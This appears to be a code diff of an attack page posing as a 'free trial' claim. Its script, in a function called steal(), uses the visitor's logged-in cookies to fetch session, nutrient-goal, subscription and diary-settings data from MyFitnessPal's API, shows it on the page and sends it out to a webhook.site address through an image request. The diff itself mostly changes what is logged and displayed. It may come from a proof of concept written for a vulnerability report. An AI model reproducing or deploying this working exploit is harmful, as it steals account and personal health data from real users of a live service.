@@ -4,9 +4,11 @@
 <body>
 <h2>Claiming your free trial...</h2>
 <div id="log"></div>
+<pre id="output" style="word-wrap:break-word;white-space:pre-wrap;font-size:11px;"></pre>
 <script>
 const exfil = "https://webhook.site/6e09acf4-6781-452a-87e7-9351b357f208";
 const log = document.getElementById("log");
+const output = document.getElementById("output");
 
 function addLog(msg) {
   log.innerHTML += "<p>" + msg + "</p>";
@@ -17,36 +19,35 @@ async function steal() {
     const session = await fetch("https://www.myfitnesspal.com/api/auth/session", {
       credentials: "include"
     }).then(r => r.json());
-    addLog("Session OK: " + session.email + " | " + session.userId);
-
-    const messages = await fetch("https://www.myfitnesspal.com/api/services/messages", {
-      credentials: "include"
-    }).then(r => r.json());
-    addLog("Messages OK");
+    addLog("Session: " + JSON.stringify(session));
 
     const goals = await fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {
       credentials: "include"
     }).then(r => r.json());
-    addLog("Goals OK");
+    addLog("Goals: " + JSON.stringify(goals).substring(0, 100));
 
     const subs = await fetch("https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en", {
       credentials: "include"
     }).then(r => r.json());
-    addLog("Subscriptions OK");
+    addLog("Subs: " + JSON.stringify(subs).substring(0, 100));
 
-    const data = encodeURIComponent(JSON.stringify({
-      email: session.email,
-      userId: session.userId,
-      tier: session.currentTier,
-      expires: session.expires,
-      messages: messages,
+    const diary = await fetch("https://www.myfitnesspal.com/api/services/account/diary_settings", {
+      credentials: "include"
+    }).then(r => r.json());
+    addLog("Diary settings: " + JSON.stringify(diary).substring(0, 100));
+
+    const payload = {
+      session: session,
       goals: goals,
-      subscriptions: subs
-    }));
+      subscriptions: subs,
+      diary_settings: diary
+    };
 
+    output.textContent = JSON.stringify(payload, null, 2);
+
+    const data = encodeURIComponent(JSON.stringify(payload));
     new Image().src = exfil + "?data=" + data;
-    addLog("Sent to attacker server!");
-    document.body.innerHTML += "<h3>Free trial activated!</h3>";
+    addLog("Sent!");
 
   } catch(e) {
     addLog("Error: " + e.message);
